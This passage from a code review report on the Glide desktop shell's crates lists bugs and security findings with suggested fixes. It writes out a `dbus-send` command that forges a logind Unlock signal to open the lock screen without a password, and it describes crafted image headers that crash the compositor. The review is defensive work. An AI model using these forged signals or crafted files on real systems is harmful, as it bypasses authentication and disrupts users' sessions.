   - **Description**: `set_window_insets` re-derives only maximized and fullscreen frames. Tiled frames come from `set_window_geometry` (`tiling.rs::place`, `apply_snap`), so they are treated as floating and grown to preserve the content rect. Every config apply pushes `[decorations] height` to all SSD windows, e.g. when Settings switches Compact (38 px) ↔ Standard (48 px). With work area (0,40,1920,1040) and a left-half window (0,40,960,1040): 48 → 38 gives (0,50,960,1030), a 10 px gap at the top, so `state::tiled_edges` turns false and the client draws rounded corners and a shadow again; 38 → 48 gives (0,30,960,1050), which `keep_reachable` turns into (0,40,960,1050), 10 px past the bottom. When the frame fills the work-area height against a side edge, keep the frame and shrink the content, as the maximized branch does.

##### Code Health
1. **`restored_frame` falls back to the primary output, unlike `output_for_window`**
   - **Location**: `crates/glide-layout/src/layout.rs:568-572`
   - **Description**: `work_area_at(saved.center())` falls back to the primary work area when the centre is on no output, while `output_for_window` falls back to an overlapping output. A window hanging more than half past the right edge of the rightmost monitor (allowed by `keep_grip_reachable`) restores onto the primary monitor after a maximize whose insets moved `saved` above the work area. Use the same overlap fallback.
2. **Unchecked `i32` arithmetic on client-derived sizes**
   - **Location**: `crates/glide-layout/src/layout.rs:75-76, 88-92, 530-531, 811-812`
   - **Description**: `glide-geom` saturates everywhere but these lines do not (`overhang * 2`, `area.size.width + overhang * 2`, `area.loc.x + area.size.width - frame.size.width`). A viewporter destination can make the surface box, and thus the xdg geometry, arbitrarily large, so a pathological client can panic a debug build. Use `saturating_*`.
3. **No tests cover the findings above**
   - **Location**: `crates/glide-layout/src/lib.rs` (tests), `crates/glide-layout/tests/protocol_boundary_tests.rs`
   - **Description**: The rescue tests use only a far-away output at a positive origin; nothing covers removing a negative-origin output while a window overlaps the remaining one, an output origin shifting under its windows, or an insets change on a frame that fills the work-area height.

---

### 20. `glide-services` (2,574 lines)

#### Summary
`glide-services` holds the session services moved out of the compositor, located at `crates/glide-services`. `logind.rs` finds the session, holds the `handle-power-key` block and `sleep` delay inhibitors, publishes LockedHint / IdleHint and turns Lock, Unlock and PrepareForSleep into `LoginEvent`s. `screensaver.rs` serves `org.freedesktop.ScreenSaver` with per-sender cookies and drops a client's cookies when it leaves the bus. `polkit_agent.rs` and `polkit_helper.rs` are the polkit authentication agent (with a caller check) and the helper protocol over `/run/polkit/agent-helper.socket` or the setuid `polkit-agent-helper-1`. `oneshot.rs` is a Mutex-based async channel (sound, no lost wakeup); `app_index.rs`, `xdg_autostart.rs`, `x11_menus.rs`, `bus.rs` (`keep_registered`) and `test_bus.rs` complete the crate.

There are 6 `unsafe` sites (`getuid` ×2, `zeroed`, `getpwuid_r`, `CStr::from_ptr`, `kill`), each with a `// SAFETY:` comment; the only other comments are two `#[allow]` justifications, so the crate complies with `AGENTS.md` § 6. `cargo clippy -p glide-services --all-targets --all-features -- -D warnings` is clean; `cargo test -p glide-services --all-features` ran 45 tests: 42 passed and 3 are ignored (they need the live system polkitd). The private `dbus-daemon` contract tests ran. Deep review found 1 Critical, 3 Bugs, no AGENTS.md trap violations and 5 Code Health issues.

A common root cause runs through the Critical finding, Bug 1 and Code Health 3: D-Bus signals are filtered by interface, member and path but never by sender. Match rules only decide what the bus *broadcasts* to Glide; `MessageIterator::from(&connection)` yields every message the connection receives, including unicast signals any peer may address to Glide's unique name, which the default bus policies allow (`<allow send_type="signal"/>`). The same pattern was found in `glide-tray` (Bug 3).

#### Findings

##### Critical
1. **Any local user can unlock the lock screen with a forged logind `Unlock` signal**
   - **Location**: `crates/glide-services/src/logind.rs:86-93, 165-206`; consumer `crates/glide-compositor/src/main.rs:443` → `crates/glide-compositor/src/state.rs:3706-3711`
   - **Description**: `watch()` adds match rules with `sender='org.freedesktop.login1'` and then reads the unfiltered `MessageIterator::from(&connection)`; `classify()` checks only interface, member and path, never `header.sender()`. Glide's unique name on the system bus and the session path are both public (`busctl --system list`, `loginctl list-sessions`). Another account (a guest on another VT, an SSH login, a compromised service uid) can run `dbus-send --system --type=signal --dest=:1.NNN /org/freedesktop/login1/session/_32 org.freedesktop.login1.Session.Unlock`, which reaches `sink(LoginEvent::Unlock)` → `unlock_screen()` → `greeter.set_auth_success(); greeter.leave()`: the screen unlocks without a password. A forged `PrepareForSleep(true)` locks the screen, stalls the thread for 400 ms and drops the sleep-delay inhibitor, so later real suspends no longer wait for the lock to be drawn; `PrepareForSleep(false)` triggers `release_held_keys`. Accept a signal only when `header.sender()` equals the current unique owner of `org.freedesktop.login1` (`GetNameOwner`, refreshed on `NameOwnerChanged`).

##### Bug
1. **A forged `NameOwnerChanged` lets one session-bus client drop another client's screen-saver inhibitors**
   - **Location**: `crates/glide-services/src/screensaver.rs:192-202, 232-239`
   - **Description**: `UnInhibit` checks the cookie's owner, but `vanished_owner` accepts any signal with interface `org.freedesktop.DBus` and member `NameOwnerChanged` without checking that it came from the bus. Any session peer, including a Flatpak app allowed to talk to `org.freedesktop.ScreenSaver`, can send `NameOwnerChanged(":1.42", ":1.42", "")` to Glide; the watcher calls `forget(":1.42")`, lifting the video player's inhibitor, and the screen blanks and locks during playback. This defeats the ownership rule that `cookies_are_never_zero_and_only_their_owner_can_release_them` tests. Require `header.sender() == "org.freedesktop.DBus"`.
2. **On the socket path, a second PAM question hangs the helper thread forever and Cancel cannot free it**
   - **Location**: `crates/glide-services/src/polkit_helper.rs:156-165, 215-218, 234-241, 255-257`
   - **Description**: `connect()` keeps three handles to one socket: the reader, the `try_clone` writer and the `Abort::Socket` clone. When the PAM stack asks a second question (an OTP module after `pam_unix`), `converse` returns `Broken` without writing; `authenticate` calls `cancel.disarm()` (dropping the abort clone) and `finish()` drops the writer, which only closes a dup. Nothing calls `shutdown()`, so `io::copy(reader.take(64K))` blocks while the socket-activated root helper blocks waiting for its answer, with no timeout anywhere. The island stays at "Checking the password…", `Cancel::cancel()` finds `abort == None` and does nothing, and each attempt leaks a `glide-polkit-helper` thread, a socket fd and a root helper instance. (The setuid-process path gets EOF on stdin and is fine.) `shutdown(Shutdown::Both)` the socket before draining on `Broken`, or keep the abort armed until `finish` returns.
3. **A failed cookie write leaves the setuid helper as a zombie**
   - **Location**: `crates/glide-services/src/polkit_helper.rs:178-184`
   - **Description**: After `cancel.arm(Abort::Process(child.id()))`, `stdin.write_all(format!("{cookie}\n"))?` returns early on error and drops the `Child` without `kill` / `wait`. A `polkit-agent-helper-1` that is not setuid exits before reading stdin, the write gets `EPIPE`, and each attempt leaves a zombie for the whole session (the compositor never reaps by `-1`, and `reap_child_processes` only polls `DETACHED_CHILDREN`). Kill and wait the child on that path, as the two earlier error branches do.

##### AGENTS.md Trap
None identified. `polkit_helper` and `test_bus` own their `Child` handles (no `waitpid(-1)`), there is no `||` over mutating calls, no global painter or cache keys, and the synchronous D-Bus round trips in `screensaver::start` / `polkit_agent::start` run once during compositor init, before the event loop.

##### Code Health
1. **The password is sent to an echo-on first prompt**
   - **Location**: `crates/glide-services/src/polkit_helper.rs:205-214`
   - **Description**: `Ask { echo }` is ignored, so the first question gets the password even when PAM marked it visible (a "Username:" or "Token:" prompt), where modules treat it as non-secret and may log it. Answer only `Ask { echo: false }`.
2. **An `Inhibit` that races its sender's disconnect leaves an orphaned cookie**
   - **Location**: `crates/glide-services/src/screensaver.rs:109-113, 232-239`
   - **Description**: zbus runs each method call in its own task while the `NameOwnerChanged` watcher is a separate thread. A client that sends `Inhibit` and exits without waiting can have `forget(owner)` run before `take_for(owner)`; the cookie then belongs to a name that will never vanish again and the screen never blanks for the rest of the session. Check `NameHasOwner(sender)` after inserting.
3. **Forged `NameOwnerChanged` signals re-run agent registration**
   - **Location**: `crates/glide-services/src/bus.rs:1-10`
   - **Description**: `appeared` has the same unchecked sender, so any system-bus user can make the polkit, NetworkManager and BlueZ agents call `Register…` again on demand; today only "already registered" errors and log spam.
4. **Autostart `Exec` handling is not spec-exact**
   - **Location**: `crates/glide-services/src/xdg_autostart.rs:68-70`
   - **Description**: `exec_command` removes only standalone `%x` words before `sh -c`: `%%` is never collapsed (`Exec=sh -c "date +%%s > f"` runs `date +%%s`), and desktop-entry escapes (`\\`, `\s`) are not undone. Reuse the launcher's `expand_exec` rules.
5. **Two tests depend on the environment or check nothing**
   - **Location**: `crates/glide-services/src/x11_menus.rs:230-241`, `crates/glide-services/src/test_bus.rs:101-104`
   - **Description**: `a_live_display_lists_windows_with_a_class` connects to whatever `DISPLAY` names and its assertion is a tautology (`window()` already returns `None` without `WM_CLASS`); in `private_bus`, a failed `read_line` drops the `--nofork` `dbus-daemon` without `kill` / `wait`, orphaning it.

---

### 21. `glide-paint` (3,144 lines)

#### Summary
`glide-paint` is the shell's CPU painter, located at `crates/glide-paint`. `lib.rs` holds the process-global `Painter`: text shaped and rasterised with cosmic-text 0.19 and composited into premultiplied BGRA with glyph coverage multiplied by the colour's alpha, grapheme ellipsising with a width cache, `painter_generation()` / `raster_revision()`, window-control and stroked glyphs, rounded and gradient rects, SVG/PNG icons and tinting, cover-art decoding (PNG/JPEG/WebP to a square BGRA image), `dominant_colour` and `fit_for_contrast`. `blur.rs` is a three-pass banded box blur (bit-exact against a reference); `border.rs` draws outset shadows, the window ring, punch-outs, the cached 9-slice `OutsetShadow` and `blit_rounded_backdrop`; `wallpaper.rs` decodes JPEG/WebP/PNG, keeps the global wallpaper slot and generation, loads it asynchronously, applies cover/contain/center/tile fits in bands and adjusts saturation.

The crate has no `unsafe` and no comments, but its `#[allow]`s carry no justification (Code Health 3). `cargo clippy -p glide-paint --all-targets -- -D warnings` is clean and all 54 unit tests pass. The review covered the uncommitted `wallpaper.rs` edit. Deep review found 1 Critical, 3 Bugs, 2 AGENTS.md trap violations and 5 Code Health issues.

#### Findings

##### Critical
1. **Untrusted image headers size a multi-gigabyte allocation before any pixel is validated; a failed allocation aborts the compositor**
   - **Location**: `crates/glide-paint/src/wallpaper.rs:25-33` (`decode_webp`), `crates/glide-paint/src/lib.rs:678-681` (`render_png` → `Pixmap::decode_png`), `crates/glide-paint/src/lib.rs:835-856` (`decode_cover`, `render_webp`, `render_jpeg`), `crates/glide-paint/src/wallpaper.rs:49-64` (`decode_jpeg`)
   - **Description**: `decode_webp` runs `vec![0u8; decoder.output_buffer_size()?]` before `read_image`. image-webp takes the VP8X canvas size from 24-bit fields and only rejects a `u32` overflow of width × height, without checking the canvas against the image chunk, so a WebP of a few dozen bytes can declare 65535×65535 with alpha (~17 GB). tiny-skia's `Pixmap::decode_png` likewise allocates `reader.output_buffer_size()` from the IHDR (png's 64 MiB limit covers only the row buffer). When the kernel refuses the mapping, `handle_alloc_error` aborts the process; running on the `glide-art-decode` thread does not help, since an abort does not unwind. The input is reachable from the web: `glide-compositor/src/media_art.rs:115-131` decodes the MPRIS `artUrl`, `glide-media/src/art.rs` downloads any http(s) URL up to 8 MiB, and browsers set that URL from a page's `navigator.mediaSession` artwork, so a web page can crash the whole session (exact outcome depends on the overcommit policy). JPEG is milder (zune-jpeg's 16384² cap still allows ~800 MB RGB plus a 1 GB `Pixmap` from a tiny progressive file); the wallpaper path has the same flaw with user-chosen input. Read the dimensions first and refuse anything above a sane cap (e.g. 16384 per side or 64 MP) before allocating; use `png::Decoder` with an IHDR check instead of `Pixmap::decode_png` on untrusted bytes.

##### Bug
1. **Colour-font glyphs (emoji) are drawn with red and blue swapped**
   - **Location**: `crates/glide-paint/src/lib.rs:393-414`
   - **Description**: The parameter `fg_argb` is really BGRA (callers pass `Color::to_buffer_bytes()` = `[b, g, r, a]`), and the code builds `TextColor::rgba(fg[0], fg[1], fg[2], fg[3])` and writes `color.as_rgba_tuple()` back as bytes 0..2. For `Content::Mask` glyphs cosmic-text returns the base colour with only alpha replaced, so the two swizzles cancel and plain text is right. For `Content::Color` glyphs it returns the glyph's own real RGBA, and `composite_over(dst, [r, g, b], a)` writes R into the B byte. Colour sources are enabled and font fallback reaches the emoji font, so "❤️" in a window title, notification, media title or overview label is drawn blue. Make the BGRA ↔ RGBA swap explicit in one place for both glyph kinds. (Whether swash colour images are straight or premultiplied was not checked; `composite_over` assumes straight.)
2. **JPEG and WebP covers are downscaled in one bilinear pass and alias**
   - **Location**: `crates/glide-paint/src/lib.rs:858-866` (`fit_into_square`), compared with `lib.rs:678-687`
   - **Description**: `render_png` halves the source with `halve_pixmap` until it is under twice the target, then samples bilinearly; `fit_into_square`, used for JPEG and WebP, draws the full decode straight into the small `MEDIA_ART` square. tiny-skia's bilinear filter has no mipmaps, so a 1200×1200 Spotify JPEG reduced to ~30 px reads 4 of every ~40×40 source pixels: the top-bar cover is noisy and moiré-prone, and `dominant_colour` is computed from that raster. Run the same halving loop first.
3. **JPEG EXIF orientation is ignored, so phone photos used as wallpaper appear rotated**
   - **Location**: `crates/glide-paint/src/wallpaper.rs:49-72`
   - **Description**: `decode_jpeg` copies zune-jpeg's raw sample order, and zune-jpeg 0.5 does not apply the Orientation tag. A portrait phone photo (stored landscape with `Orientation = 6`) chosen as wallpaper shows sideways, and the cover/fit maths run on the wrong aspect ratio; GTK and image viewers honour the tag. Transpose / flip the `Pixmap` according to the EXIF orientation after decoding.

##### AGENTS.md Trap
1. **`saturate_in_place` with a factor above 1 breaks premultiplication ("Straight colours in solid buffers")**
   - **Location**: `crates/glide-paint/src/wallpaper.rs:115-134`; caller `crates/glide-compositor/src/backend/tty.rs:1298-1300` (`BACKDROP_SATURATION = 1.6`)
   - **Description**: `luma + (value - luma) * factor` is computed directly on premultiplied BGRA and clamped to 0..255, never to the pixel's alpha. Premultiplied `(b=10, g=10, r=100, a=100)` gives r′ ≈ 138 > a. The compositor applies 1.6 to the *blurred* wallpaper; with `Contain` or `Center` fit the blur spreads the image edge into the transparent letterbox, leaving a wide band of partial-alpha pixels that saturation pushes above alpha, so an additive bright fringe appears under the launcher / overview glass and every blurred backdrop. (Factors ≤ 1 cannot exceed alpha.) Clamp each channel to `px[3]`, or un-premultiply, saturate and re-premultiply.
2. **Uncommitted change: the first wallpaper load decodes the embedded PNG on the render path, then rebuilds everything ("Blocking the event loop")**
   - **Location**: `crates/glide-paint/src/wallpaper.rs:92-104, 136-141`
   - **Description**: The working-tree diff removed the synchronous first-load branch, so the load always runs on `glide-wallpaper`. The first `render_surface` then runs with `WALLPAPER_SOURCE == None`, and `draw_wallpaper_into` calls `decode_wallpaper(embedded_wallpaper_bytes())` (an 841 KB PNG) synchronously on the compositor thread, once per output and per overview-strip thumbnail size, discarding the result. When the thread installs the user's image, `wallpaper_generation` bumps and every wallpaper raster, its blur and its saturation pass are rebuilt; since the size is unchanged, `wallpaper_old` visibly crossfades from the default wallpaper to the user's on every start outside the greetd handoff cover. `let _ = spawn(load)` also means a failed spawn never calls `done` and no wallpaper is ever installed. Install the embedded decode into the empty slot (under the request check) or restore the synchronous first load, and run `load` inline when the spawn fails.

##### Code Health
1. **`init_or_replace` always bumps `painter_generation`**
   - **Location**: `crates/glide-paint/src/lib.rs:76-81`; caller `crates/glide-compositor/src/state.rs:3115-3118`
   - **Description**: `refresh_painter_font` runs on every config apply (Settings edits, Dark Style, the appearance schedule), rebuilding the `FontSystem` from a cloned database, dropping the width and swash caches and invalidating every text raster in the shell even when size and family did not change. Skip the replacement when `(font_size, family)` is unchanged.
2. **The system font database is cached for the life of the process**
   - **Location**: `crates/glide-paint/src/lib.rs:59-74`
   - **Description**: `SYSTEM_FONTS` is filled once; a font installed mid-session and then chosen as `[general] font-family` is missing, so the shell falls back until restart while GTK apps pick it up. Reload when the requested family is absent.
3. **`#[allow]`s without justification, and redundant cast allows**
   - **Location**: `crates/glide-paint/src/lib.rs:1-8, 356, 1238, 1291`; `crates/glide-paint/src/border.rs:140`
   - **Description**: The crate-level `cast_*` allows duplicate the workspace allows; `too_many_arguments`, `similar_names` and `many_single_char_names` are silenced without the justification §5 / §6 require. The 10–15-argument drawing functions would be better taking a canvas / rect struct.
4. **Golden tests write into the source tree and create their own baselines**
   - **Location**: `crates/glide-paint/src/lib.rs:1809-1837`
   - **Description**: On a mismatch the test writes `*.actual.png` next to the goldens; when a baseline is missing it writes one and fails only that run, so a deleted golden is silently re-created from whatever the code renders. Gate baseline creation behind an environment variable and write `.actual` files under `target/`.
5. **`decode_cover` decodes the whole image once per output size**
   - **Location**: `crates/glide-paint/src/lib.rs:835-866`; caller `crates/glide-compositor/src/media_art.rs:127-130`
   - **Description**: The compositor decodes each cover twice (`MEDIA_ART` and `MEDIA_ART_LARGE`), i.e. two full decodes and full-size buffers per track change. Decode once and resample to each size.

---

### 22. `glide-system` (3,178 lines)

#### Summary
`glide-system` holds the compositor's system-side plumbing, located at `crates/glide-system`. `system_info.rs` runs the `glide-system-status` poller: a `Topics` hub with a schedule decides what to read (wpctl / pactl audio, sysfs backlight and keyboard LEDs, nmcli Wi-Fi / VPN, bluetoothctl, rfkill, powerprofilesctl, pw-dump privacy, `/proc` camera openers, gsettings reduced motion); it also hosts the `glide-controls` worker (coalesced volume, mic and brightness writes) and the `glide-gsettings` appearance worker. `status_hooks.rs` runs the event watchers (`pactl subscribe`, `pw-dump --monitor` with an incremental `Graph`, a udev / inotify / `/dev/rfkill` poll loop, system-bus NM / BlueZ / power-profiles signals, dconf `Notify`) under a supervisor with 2–60 s backoff. `theme_export.rs` writes the GTK 3/4 CSS, `settings.ini`, qt5ct / qt6ct, `kdeglobals`, Kvantum and GtkSourceView files; `spawn.rs` tracks children in `DETACHED_CHILDREN` with `try_wait` (no `waitpid(-1)`); `icon_plates.rs` builds the dark-plate Colloid derivative; `cursor_config.rs` and `status.rs` hold cursor settings and `SystemStatus`. Battery parsing is re-exported from `glide-shell` (reviewed there).

The crate has two `unsafe` blocks (`pre_exec` with `prctl(PR_SET_PDEATHSIG)`, `getpwuid`), both with `// SAFETY:` comments; the only other comment justifies an `#[allow]`, so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-system --all-targets -- -D warnings` is clean; 30 of 31 tests pass and 1 (`icon_plates::tests::preview`) is ignored. The nmcli `\:` / `\\` unescaping, `pactl subscribe` filtering, the pw-dump graph, rfkill draining and the hub's settle logic were checked and look correct. Deep review found 3 Bugs, no AGENTS.md trap violations and 4 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **Bluetooth reads as "on" whenever BlueZ says it is off but rfkill does not block it**
   - **Location**: `crates/glide-system/src/system_info.rs:540-568`
   - **Description**: `read_bluetooth` returns `true` only for `Powered: yes`; anything else, including a definite `Powered: no`, falls through to the rfkill scan, which returns `found_bt` (true) when the switch is not blocked. Settings › Bluetooth turns the radio off with `bluetoothctl power off` only (`glide-settings/src/services/bluetooth.rs:235-240`), so after the `Adapter1.Powered` signal the top bar and quick-settings tile keep showing Bluetooth on, and the first tile click runs `set_bluetooth(false)` with no visible effect. The same happens with `AutoEnable=false` at boot and when bluetoothd is stopped (`bluetoothctl` times out, then rfkill says "on", and `read_bluetooth_connected` burns another 2 s timeout). Return `false` on an explicit `Powered: no` and use rfkill only when `bluetoothctl` gave no answer.
2. **The wpctl level is clamped to 100 % while callers rely on levels up to `max-volume-pct` (150)**
   - **Location**: `crates/glide-system/src/system_info.rs:438-446, 455-461`
   - **Description**: `parse_wpctl_volume` does `.clamp(0.0, 100.0)`, so 130 % is reported as `volume_pct = 100`. The compositor treats `status.volume_pct` as the current level: `scrolled_volume(status.volume_pct, step, max)` (`input.rs:2994`), the slider ceiling (`state.rs:1901`) and the keybind ceiling `max_volume_pct.max(status.volume_pct)` (`input.rs:1970`, "a key never lowers it"). With `max-volume-pct = 130` and the volume at 130 %, scrolling *up* over the status block sets 105 % — the volume drops. After lowering `max-volume-pct` from 150 to 100 with the volume at 140 %, the ceiling is 100 and volume-up runs `wpctl set-volume -l 1.00 … 5%+`, lowering it to 100 %. The OSD and the "NN%" readout never exceed 100. The pactl fallback does not clamp at 100 but parses into `u8`, reporting 50 % above 255 %. Clamp to the `u8` range instead and update `a_wpctl_level_needs_its_volume_line`, which asserts `1.30 → 100`.
3. **Any read error on a user config file is treated as an empty file, which is then replaced**
   - **Location**: `crates/glide-system/src/theme_export.rs:67, 134-136, 200-201, 231, 290-292`
   - **Description**: `write_settings_ini`, `write_gtk`, `write_qtct`, `write_kde` and `write_kvantum` all do `std::fs::read_to_string(&path).unwrap_or_default()`, edit the string and write it back atomically. Non-UTF-8 content (`InvalidData`), `EACCES` on a root-owned file left by a `sudo` edit, or `EIO` all become `""`, and `write_atomic` renames over the file, which the user-owned directory permits. A `~/.config/gtk-3.0/gtk.css` with a Latin-1 byte in a comment is replaced on the next config apply by the single line `@import url("glide.css");`, and the user's CSS is lost; the same applies to `settings.ini`, `qt5ct.conf`, `qt6ct.conf`, `kdeglobals` and `kvantum.kvconfig`. Treat only `NotFound` as empty and skip the write on any other error.

##### AGENTS.md Trap
None identified. No `||` over mutating calls (`run_blocking_or` is an intended fallback), no `waitpid(-1)` (owned `Child`s only, watchers killed and reaped, PDEATHSIG set), setters and `poke` / `sync_desktop_appearance` / `icon_plates::ensure` hand off to threads, and tests use pid-suffixed temp dirs with a lock around `DETACHED_CHILDREN`.

##### Code Health
1. **`getpwuid` is not thread-safe, and its SAFETY comment over-claims**
   - **Location**: `crates/glide-system/src/system_info.rs:747-760`
   - **Description**: The comment says GECOS "is copied out before any other libc call can overwrite it", which only holds within one thread; the poller runs it while other threads exist. `glide-services::polkit_agent` already uses `getpwuid_r`.
2. **The icon-theme swap is not atomic**
   - **Location**: `crates/glide-system/src/icon_plates.rs:131-134`
   - **Description**: `remove_dir_all(&dest)` then `rename(&partial, &dest)` leaves a window in which the active GSettings `icon-theme` (`Glide-Colloid*-Dark`) does not exist, and a failure mid-delete leaves a half-deleted theme. Rename `dest` aside first (or `renameat2(RENAME_EXCHANGE)`), then delete the old copy.
3. **A slow topic delays every other topic**
   - **Location**: `crates/glide-system/src/system_info.rs:33-79`
   - **Description**: All topics are read serially with 2 s timeouts per command; with an adapter but no bluetoothd, each Bluetooth / radios batch spends ~4 s in `bluetoothctl`, and audio pokes from media keys wait behind it, so the volume OSD (shown only when a sample within 2 s of the key changes) can be missed.
4. **Several blocking commands have no timeout**
   - **Location**: `crates/glide-system/src/system_info.rs:918-926, 1110-1117, 1160-1164, 1187-1193`; `crates/glide-system/src/theme_export.rs:97-113, 257-262`
   - **Description**: `run_blocking` (the `glide-controls` worker), `gsettings` get / set, `dbus-update-activation-environment` and `flatpak override` use `.status()` / `.output()` without a deadline (`busctl call` alone defaults to 25 s), so one hung `wpctl` or `gsettings` stalls every later write on that worker. `run_with_timeout` already exists.

---

### 23. `glide-shot` (3,425 lines)

#### Summary
`glide-shot` is the pure part of the screenshot tool, located at `crates/glide-shot`. `model.rs` is the state machine: the choose stage (Area / Window / Screen), the edit stage with eight tools, undo / redo, select / move / resize gestures, nudging, and toolbar layout and docking (`edit_bar`: below the capture, else above, else inside). `compose.rs` does the pixel work: blur patches (`obscured`), marks drawn with tiny-skia, the three-layer shadow, rounded corners and the premultiplied → straight conversion for the PNG. `render.rs` builds the smithay render pieces and caches their rasters (bar, hover layers, badge, handles, tooltip, window ring, marks, blur patches); `lib.rs::crop_region` wraps `raster::physical_crop`.

The crate has no `unsafe`; its one comment justifies `#[allow(clippy::large_enum_variant)]`, so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-shot --all-targets -- -D warnings` is clean; 30 of 31 tests pass and 1 (the PNG preview) is ignored. Several defects sit in the compositor glue (`crates/glide-compositor/src/shot.rs`, `input.rs`) and were checked against how the crate's API is called. Deep review found 6 Bugs, 2 AGENTS.md trap violations and 3 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **Window-mode frames are shifted by the client's xdg geometry offset ("Render location vs element location")**
   - **Location**: `crates/glide-compositor/src/shot.rs:183-190` (used at `:256` and `:582`)
   - **Description**: `frame_of` computes `location + geometry.loc - (0, header)` where `location` is `space.element_location(window)`, which is already the window-geometry origin (the render location is `location - geometry.loc`, as `background_effect.rs:58` and the tty window capture use). The offset is counted twice, so every CSD window with shadow insets (GTK 4 / libadwaita, Chrome on Wayland) gets a frame displaced right and down by ~20–30 px: `window_at` hit-tests the wrong rectangle near edges, the ring and undimmed hole sit off the window, the window-alone image jumps in the edit stage, and without a window image (Bug 2) `Job::compose` crops the frozen frame at the shifted rectangle, cutting the left and top edges and pulling in neighbours. Drop `geometry.loc`, or take the frame from the layout's `frame_geometry()`.
2. **Ctrl+C in the choose stage skips the window-alone capture in Window mode**
   - **Location**: `crates/glide-shot/src/model.rs:595-598`; `crates/glide-compositor/src/shot.rs:106-108, 407`
   - **Description**: `shortcut` maps Ctrl+C / Ctrl+Insert to `ShotKey::Copy` in both stages and `shot_key` calls `shot.finish(Outcome::Copy)`. In the choose stage `finish` returns `if self.capture() == Outcome::Nothing { Nothing } else { Redraw }`, turning the `Outcome::Window(index)` from `enter_edit` into `Redraw`, so `session.window_capture` is never set. The editor opens on the frozen frame and the final job crops it, so windows overlapping the chosen one appear in the result, against the documented "overlapping windows never appear". Return `capture()`'s outcome unchanged when not editing.
3. **The Capture disc in Window mode captures the window under the toolbar, not the highlighted one**
   - **Location**: `crates/glide-shot/src/model.rs:312, 417-426`
   - **Description**: Without a gesture, `motion` re-evaluates `hovered = self.window_at(pos)` whenever `control.is_none()`, which includes the bar's padding, rule slots and gaps. Hover window A, then move to the Capture disc: crossing the bar's top padding sets `hovered` to whatever lies under the bar (window B, or `None`), and on the disc `hovered` stays there. A click captures B; with nothing under the bar the disc is disabled and the click does nothing. `set_mode(Window)` behaves the same with the pointer over the bar. Leave `hovered` unchanged while the pointer is over the bar.
4. **The size badge does not match the saved PNG, and the crop includes pixels drawn as outside the selection**
   - **Location**: `crates/glide-shot/src/render.rs:298-307, 314-321, 557-558`; `crates/glide-shell/src/raster.rs:19-25`
   - **Description**: Selections use raw f64 pointer positions. The badge shows `round(w·scale) × round(h·scale)`, while `physical_crop` uses `floor(x0·s)` and `ceil(x1·s)`. At scale 1 a 100 px-wide selection starting at x = 10.5 reads "100 × …" but saves 101 px (columns 10–110), and the dim and outline (`solid` rounds 10.5 → 11) show column 10 as outside although it is in the PNG. At fractional scales this happens even with integer logical positions. Snap selection edges to the physical grid in the model, or derive the badge from `crop_region`.
5. **A resized selection can end up entirely off-screen, and saving then loses the capture**
   - **Location**: `crates/glide-shot/src/model.rs:695, 726-742`; `crates/glide-compositor/src/shot.rs:526-563`
   - **Description**: `resized` pads the result to `MIN_SIDE` from `area.loc` without re-clamping. On a 1920-wide output, dragging the W handle of [1000, 1920] to the right edge gives x0 = x1 = 1920 and a selection [1920, 1924], fully off-screen; `can_capture()` is true, Enter returns `Save`, `finish_shot` closes the tool before `crop_region` returns `None`, and the job fails with "nothing to capture", losing the capture and its marks. A selection partly off-screen also makes the `grow` branch of `nudge` panic (`clamp(MIN_SIDE, bounds.w - loc.x)` with min > max). Clamp the padded rectangle back into `bounds`.
6. **A release of any other mouse button ends the left-button gesture**
   - **Location**: `crates/glide-compositor/src/input.rs:2535-2541`; `crates/glide-compositor/src/shot.rs:378-389`; `crates/glide-shot/src/model.rs:532-560`
   - **Description**: `shot_button` ignores non-left presses, but every release goes to `shot_release`, which calls `Shot::release` without a button check. Clicking the right or middle button during a left-button selection or pen stroke commits the selection (entering the editor) or the half-drawn stroke; the rest of the drag stops following the pointer and the real left release finds no gesture. Ignore releases other than `LEFT`.

##### AGENTS.md Trap
1. **The global painter is used outside the render path ("Global state leaking between tests")**
   - **Location**: `crates/glide-compositor/src/shot.rs:487-507` (`:495`)
   - **Description**: `refresh_shot_sprites` calls `crate::paint::current()` from `shot_outcome`, which runs from pointer and key handlers. §7 forbids reaching for the global painter outside rendering because `current()` bumps `painter_generation()` on first use. Harmless in production (already initialised) and no current test drives this path, but a future test of `shot_button` / `shot_key` would hit the trap. Build the sprites in `render()` from the `&Painter` it receives.
2. **The tooltip appears by opacity alone, and opacity is not the shorter track (§8 motion, not fade)**
   - **Location**: `crates/glide-shot/src/render.rs:470-471, 477-481, 499, 545`
   - **Description**: The tooltip is drawn at a fixed position with `alpha = since * openness` and no travel or scale (§8 requires ≥ 6 px or 6 % for tooltips and overrides spec §17.2). The bar rises `BAR_RISE` = 8 px but its alpha equals `openness`, the same progress as the rise, instead of `min(1, p / 0.4)`; the outline, handles, badge and ring also fade with `openness` alone. Give the tooltip a 6 px rise and drive opacities through `motion::assist`.

##### Code Health
1. **Clicks on other outputs act at the screen edge instead of being ignored**
   - **Location**: `crates/glide-shot/src/model.rs:378-380, 445-447`; `crates/glide-compositor/src/shot.rs:360-376`
   - **Description**: Pointer positions on any output are clamped into `bounds`, so a click on a second monitor starts a selection at the edge (Area), picks the window touching that edge (Window) or captures the whole screen (Screen). The tool is single-output; positions outside `bounds` should be swallowed.
2. **Large rasters are rebuilt every frame for simple shapes**
   - **Location**: `crates/glide-shot/src/render.rs:381-397, 618-628, 704-719, 1315-1327`
   - **Description**: While a pen stroke is drawn, `shape_key` changes on every motion and the draft is re-rasterised over its whole bounding box (new `Image`, `to_bgra` clone, new `MemoryRenderBuffer`): ~33 MB per frame for a screen-sized stroke at 4K. The Window-mode ring is a full window-sized buffer rebuilt on every hover change for a 12 % tint and a stroke.
3. **Backspace removes one Unicode scalar, not one grapheme**
   - **Location**: `crates/glide-shot/src/model.rs:635-645`
   - **Description**: `text.pop()` is safe on char boundaries, but leaves a broken partial cluster for ZWJ emoji, flags or variation selectors in the Text draft.

---

### 24. `glide-shell` (3,431 lines)

#### Summary
